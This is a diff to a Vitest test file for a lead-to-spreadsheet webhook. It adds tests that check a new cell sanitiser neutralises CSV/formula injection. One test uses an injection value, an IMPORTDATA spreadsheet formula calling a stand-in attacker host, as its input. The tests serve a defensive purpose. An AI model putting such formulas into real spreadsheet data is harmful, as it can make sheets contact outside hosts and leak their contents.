@@ -1,5 +1,5 @@
 import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
-import { pushLead, type LeadRecord } from "@/lib/sheet";
+import { pushLead, sanitizeCell, type LeadRecord } from "@/lib/sheet";
 
 const lead: LeadRecord = {
   name: "An Nguyen",
@@ -46,6 +46,26 @@ describe("pushLead", () => {
       tier: "hot",
       points: 90,
     });
+  });
+
+  it("neutralizes CSV/formula injection in free-text fields (B3)", async () => {
+    const fetchMock = vi
+      .fn()
+      .mockResolvedValue(new Response(null, { status: 200 }));
+    vi.stubGlobal("fetch", fetchMock);
+
+    await pushLead({ ...lead, name: '=IMPORTDATA("http://evil.tld")' });
+
+    const body = JSON.parse(
+      (fetchMock.mock.calls[0][1] as RequestInit).body as string,
+    );
+    expect(body.name.startsWith("'=")).toBe(true);
+  });
+
+  it("sanitizeCell prefixes only dangerous leading chars", () => {
+    expect(sanitizeCell("=1+1")).toBe("'=1+1");
+    expect(sanitizeCell("+84912345678")).toBe("'+84912345678");
+    expect(sanitizeCell("An Nguyen")).toBe("An Nguyen");
   });
 
   it("throws when the webhook responds with an error status", async () => {
